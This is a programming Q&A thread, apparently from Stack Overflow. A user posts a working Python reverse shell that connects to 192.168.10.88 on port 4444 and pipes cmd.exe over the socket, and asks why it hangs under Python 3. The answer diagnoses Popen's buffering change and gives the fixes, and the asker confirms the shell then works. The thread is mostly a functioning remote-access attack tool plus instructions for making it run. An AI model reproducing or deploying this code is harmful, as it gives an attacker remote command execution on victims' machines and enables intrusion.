<div class="post-text" itemprop="text">
<p><strong>The following is my reverse_shell python code</strong></p>
<pre><code>import os,socket,subprocess,threading
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) &gt; 0:
            p.stdin.write(data)


def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.10.88",4444))

p=subprocess.Popen(['\\windows\system32\\cmd.exe'], stderr=subprocess.STDOUT, stdout=subprocess.PIPE, stdin=subprocess.PIPE)




s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()


try:
    p.wait()
except KeyboardInterrupt:
    s.close()
</code></pre>
<p>I'm using netcat as a listener.The problem is when I run the above code using python 3.4 shell commands get stuck and I didn't get output but If I use python 2 it works fine.</p>
</div>
<div class="post-text" itemprop="text">
<p>The default argument for <code>bufsize</code> to <code>Popen</code> changed between Python 2 and Python 3. In <a href="https://docs.python.org/2/library/subprocess.html#popen-constructor" rel="nofollow noreferrer">Python 2</a> it is <code>0</code> meaning unbuffered. In <a href="https://docs.python.org/3/library/subprocess.html#popen-constructor" rel="nofollow noreferrer">Python 3</a> it is <code>-1</code> which means use a buffer of size <code>io.DEFAULT_BUFFER_SIZE</code>. In Python 3 the program seizes up because the program has written the data to <code>p.stdin</code>, but has not yet flushed it -- as the buffer has not filled up. On Windows, <code>io.DEFAULT_BUFFER_SIZE</code> is 8,192 and so you would need to write 8kB of data to the socket (from netcat) before you would see any output.</p>
<p>You can switch back to an unbuffered stream or you can manually flush the data after each write. Or you can set the <code>universal_newlines</code> argument and use line buffering (<code>bufsize=1</code>).</p>
</div>
<span class="comment-copy">Where does it get stuck?</span>
<span class="comment-copy">On netcat window after getting shell the cursor goes to the next line but I did not get any ouput of any command like dir command.This is with python 3 but python 2 works fine and I did get output of all shell commands.</span>
<span class="comment-copy">This really helps and after some modifications I'm getting output now.Thanks</span>
